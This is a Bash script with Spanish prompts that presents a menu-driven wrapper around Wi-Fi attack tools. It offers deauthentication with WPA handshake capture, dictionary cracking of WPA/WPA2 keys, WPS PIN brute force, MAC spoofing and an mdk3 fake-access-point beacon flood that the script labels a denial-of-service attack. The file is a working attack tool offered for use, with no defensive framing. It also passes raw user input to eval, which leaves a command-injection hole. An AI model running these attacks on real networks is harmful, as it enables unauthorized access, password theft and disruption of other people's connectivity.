#!/bin/bash 

if ! command -v wifite &>/dev/null || ! command -v airmon-ng &>/dev/null || ! command -v airodump-ng &>/dev/null || ! command -v aircrack-ng &>/dev/null || ! command -v bully &>/dev/null || ! command -v mdk3 &>/dev/null; then
  echo "Faltan dependencias. Por favor, instale las herramientas necesarias..." >&2
  apt install aircrack-ng bully mdk3 wifite
  exit 1
fi

echo "Seleccione una opción:"
echo "1. Iniciar modo monitor"
echo "2. Detener modo monitor"
echo "3. Mostrar información de red"
echo "4. Reiniciar red"
echo "5. Escanear redes disponibles"
echo "6. Ataque de deautenticación y captura de handshake"
echo "7. Romper clave WPA/WPA2"
echo "8. Ataque de fuerza bruta WPS"
echo "9. Cambiar dirección MAC"
echo "10. Ataque de denegación de servicio (AP falsas)"
echo "11. Iniciar Wifite"
echo "12. Iniciar Wireshark"
echo "0. Salir"

while true; do
  read -p ">> " OPCION

  case $OPCION in
    1)
      echo -n "Interfaz: (wlan0 | wlan1): "
      read interfaz
      comando="/usr/sbin/airmon-ng start $interfaz && /usr/sbin/airmon-ng check kill"
      eval $comando
      ;;
    2)
      echo -n "Interfaz: (wlan0mon | wlan1mon): "
      read interfaz
      comando="/usr/sbin/airmon-ng stop $interfaz"
      eval $comando
      ;;
    3)
      /usr/sbin/ifconfig
      ;;
    4)
      echo -e "\n"
      echo "Reiniciando red, por favor, espere..."
      comando="service networking restart && systemctl start NetworkManager"
      eval $comando
      echo "Proceso finalizado."
      ;;
    5)
      echo -n "Interfaz: (wlan0mon | wlan1mon): "
      read interfaz
      comando="/usr/sbin/airodump-ng $interfaz"
      echo -e "\n[AVISO] Cuando termine, presione CTRL + C"
      eval $comando
      ;;
    6) 
      echo -n "Interfaz: (wlan0mon | wlan1mon): "
      read interfaz
      comando="/usr/sbin/airodump-ng $interfaz"
      echo -e "\n[AVISO] Cuando termine, presione CTRL + C"
      eval $comando
      echo -n "BSSID del objetivo: "
      read bssid
      echo -n "CANAL del objetivo: "
      read canal
      echo -n "RUTA donde desea guardar el handshake: "
      read ruta
      echo -n "NÚMERO de paquetes (max 10000 | min 0): "
      read paquetes
      comando="/usr/sbin/airodump-ng -c $canal --bssid $bssid -w $ruta $interfaz | xterm -e /usr/sbin/aireplay-ng -0 $paquetes -a $bssid $interfaz"
      eval $comando
      ;;
    7) 
      echo -n "RUTA al handshake: "
      read ruta
      echo -n "RUTA al diccionario: "
      read diccionario
      comando="/usr/sbin/aircrack-ng $ruta -w $diccionario"
      eval $comando
      ;;
    8) 
      echo -n "Interfaz: (wlan0mon | wlan1mon): "
      read interfaz
      echo -n "BSSID del AP: "
      read bssid
      echo -n "CANAL del AP: "
      read canal
      echo -n "ESSID del AP: "
      read essid
      comando="/usr/sbin/bully $interfaz -b $bssid -c $canal -e $essid --force"
      eval $comando
      ;;
    9) 
      echo -n "Interfaz: (wlan0 | wlan1): "
      read interfaz
      echo -n "NUEVA dirección MAC: "
      read nuevaMAC
      ifconfig $interfaz down
      echo "Cambiando la MAC de la interfaz $interfaz a $nuevaMAC"
      ifconfig $interfaz hw ether $nuevaMAC
      echo "La dirección MAC cambió a: $nuevaMAC"
      ifconfig $interfaz up
      echo "La interfaz está lista."
      ifconfig $interfaz
      ;;
    10) 
      echo -n "INTERFAZ: (wlan0 | wlan1): "
      read interfaz
      echo -n "CANAL: "
      read canal
      echo -n "¿Desea crear un diccionario de falsos APs? [s/n]: "
      read crearDic
      if [[ $crearDic == "s" ]]; then 
        read -p $' Nombre del AP (máx=16): ' nombreAP
        read -p $' Nombre del diccionario: ' nombreDiccionario
        printf " Número de AP's: 100\n"
        printf " Diccionario creado con éxito >\e[1;32m $(pwd)/$nombreDiccionario\e[0m\n"

        for i in {1..100}; do 
          echo "$nombreAP-$i"; 
        done > $nombreDiccionario
      fi
      echo -n "RUTA del diccionario (por defecto: /wordlist/fakeAP.txt): "
      read diccionario
      echo -e "\n[AVISO] Presione CTRL + C para detener el ataque"
      /usr/sbin/mdk3 $interfaz b -f $diccionario -a -s 1000 -c $canal
      ;;
    11) 
      echo -e "Iniciando Wifite..."
      /usr/sbin/wifite
      ;;
    12) 
      echo -e "Iniciando Wireshark..."
      /usr/sbin/wireshark
      ;;
    0) 
      echo "¡Adiós!"
      exit
      ;;
    *)
      echo "Opción inválida."
      ;;
  esac
done